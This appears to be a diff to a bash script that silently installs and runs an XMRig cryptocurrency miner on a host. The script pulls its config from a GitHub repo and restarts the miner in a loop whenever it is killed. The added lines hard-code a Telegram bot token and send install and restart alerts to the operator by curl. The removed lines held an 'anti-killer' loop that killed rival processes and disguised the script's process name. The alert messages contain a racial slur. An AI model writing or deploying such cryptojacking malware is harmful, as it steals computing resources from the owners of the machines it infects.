@@ -1,6 +1,8 @@
 #!/bin/bash
 
 xmrver="6.22.2"
+bot_token="7838894416:AAGasfUq4ipYV1Kd65_zXMKDvs7in_hVpOM"
+chat_id="69420690"
 
 if [ -d /tmp ]; then
     echo "/tmp exists"
@@ -12,7 +14,7 @@ fi
 unalias -a
 
 sudo -n apt update
-sudo -n apt install -y wget util-linux dos2unix
+sudo -n apt install -y wget util-linux
 sudo -n apk add wget util-linux
 sudo -n dnf install wget util-linux
 
@@ -32,31 +34,19 @@ cd xmrig-$xmrver
 chmod +x xmrig
 
 rm -f config.json
-$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/texniaz/main/config.json
-
+$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/texniaz/refs/heads/main/config.json
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/kasm/kasm-$randnum/g" config.json
 
-echo "ANTI-KILLER LOOP ENABLED"
+nohup ./xmrig > /dev/null 2>&1 &
 
-cat <<EOF > killer.sh
-#!/bin/bash
+echo "Miner Installed 💀"
+curl -s -X POST https://api.telegram.org/bot$bot_token/sendMessage -d chat_id=$chat_id -d text="Nigga Miner Installed ✅"
+
 while true; do
-  pkill -f xmrig
-  pkill -f minerd
-  pkill -f kworker
-  pkill -f kthreadd
-  echo "texniaz" > /proc/\$$/comm
+  sleep 60
   if ! pgrep -f xmrig; then
     nohup ./xmrig > /dev/null 2>&1 &
+    curl -s -X POST https://api.telegram.org/bot$bot_token/sendMessage -d chat_id=$chat_id -d text="Nigga Miner Restarted 🔥"
   fi
-  sleep 10
 done
-EOF
-
-chmod +x killer.sh
-
-nohup ./killer.sh > /dev/null 2>&1 &
-nohup ./xmrig > /dev/null 2>&1 &
-clear
-echo "TEXNIAZ MINER INSTALLED 💀🔥 - UNKILLABLE 🧠"
